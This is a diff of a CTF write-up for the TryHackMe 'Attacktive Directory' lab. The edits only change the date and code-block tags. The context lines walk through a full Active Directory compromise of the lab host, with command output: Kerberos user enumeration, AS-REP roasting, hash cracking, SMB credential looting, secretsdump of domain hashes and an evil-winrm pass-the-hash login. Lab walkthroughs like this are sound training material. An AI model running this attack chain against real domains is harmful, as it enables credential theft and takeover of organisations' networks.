@@ -2,7 +2,7 @@
 title: Attacktive Directory – Writeup
 ---
 
-_**Nov 12, 2020**_
+_**Jan 09, 2021**_
 
 [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory) Writeup
 
@@ -21,7 +21,7 @@ Learning Objectives :
 
 ## Recon :
 
-```
+```sh
 bvr0n@kali:~$ nmap -sC -sV 10.10.193.34
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-12 06:56 EST
 Nmap scan report for 10.10.193.34
@@ -65,11 +65,11 @@ From this scan we discover the Domain Name of the machine as well as the the ful
 
 For further enumeration we need to add domain name and add it to `/etc/hosts`
 
-```
+```sh
 bvr0n@kali:~$ echo 10.10.193.34 spookysec.local >> /etc/hosts
 ```
 
-```
+```sh
 root@kali:~# enum4linux -a spookysec.local
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Nov 12 15:15:56 2020
 
@@ -117,7 +117,7 @@ Domain Sid: S-1-5-21-3591857110-2884097990-301047963
 
 Kerbrute is a tool that performs Kerberos pre-auth bruteforcing, in this case we will be using the username bruteforce feature.
 
-```
+```sh
 bvr0n@kali:~/Kerbute$ ./kerbrute_linux_amd64 userenum -d spookysec.local  --dc spookysec.local ~/CTF/THM/AttacktiveDirect/userlist.txt
 
     __             __               __     
@@ -152,7 +152,7 @@ Version: v1.0.3 (9dad6e1) - 11/12/20 - Ronnie Flathers @ropnop
 Now that we have discovered a several usernames we can use a technique called ASREPRoasting, meaning if a user does not have the Kerberos preauthentication property selected it is possible to retrieve the password hash from that user. 
 Impacket provides a tool called GetNPUsers.py which can query the AD and if the property above is not selective it will export their TGT.
 
-```
+```sh
 bvr0n@kali:/opt/impacket/examples$ python3 GetNPUsers.py spookysec.local/svc-admin -no-pass
 Impacket v0.9.22.dev1+20201105.154342.d7ed8dba - Copyright 2020 SecureAuth Corporation
 
@@ -161,7 +161,7 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a9ba7723b142129ccf7d864d21ad5804$2e43b82
 ```
 Since we were able to get the svc-admin hash, Let's decrypt it now :
 
-```
+```sh
 bvr0n@kali:~/CTF/THM/AttacktiveDirect$ sudo john hash-svc-admin --wordlist=/home/bvr0n/Documents/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
@@ -174,7 +174,7 @@ management****   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
 
 Since we have user credentials we can attempt to log into SMB and explore any shares from the domain controller.
 
-```
+```sh
 bvr0n@kali:~/Kerbute$ smbclient -U svc-admin -L 10.10.193.34 
 Enter WORKGROUP\svc-admin's password: 
 
@@ -190,7 +190,7 @@ SMB1 disabled -- no workgroup available
 ```
 Enumerating the shares, one had some credentials inside :
 
-```
+```sh
 bvr0n@kali:~/Kerbute$ smbclient -U svc-admin //10.10.193.34/backup
 Enter WORKGROUP\svc-admin's password: 
 Try "help" to get a list of possible commands.
@@ -201,13 +201,13 @@ smb: \> ls
 ```
 The file content is `base64` encoded, we can decoded simply like this :
 
-```
+```sh
 bvr0n@kali:~/CTF/THM/AttacktiveDirect$ strings backup_credentials.txt | base64 -d
 backup@spookysec.local:******2517860
 ```
 Using the backup account we can use another tool from Impacket this time called `secretsdump.py`, we will be able to get all the password hashes that this user account has access to.
 
-```
+```sh
 bvr0n@kali:~/CTF/THM/AttacktiveDirect$ python3 /opt/impacket/examples/secretsdump.py -just-dc backup@spookysec.local
 Impacket v0.9.22.dev1+20201105.154342.d7ed8dba - Copyright 2020 SecureAuth Corporation
 
@@ -222,7 +222,7 @@ spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b
 ```
 Now we are in possession of the Administrator password hash. The next step will be performing a `Pass the Hash Attack`. 
 
-```
+```sh
 bvr0n@kali:~/CTF/THM/AttacktiveDirect$ evil-winrm -i 10.10.193.34 -u Administrator -H ********************7260b0bcb4fc
 
 Evil-WinRM shell v2.3
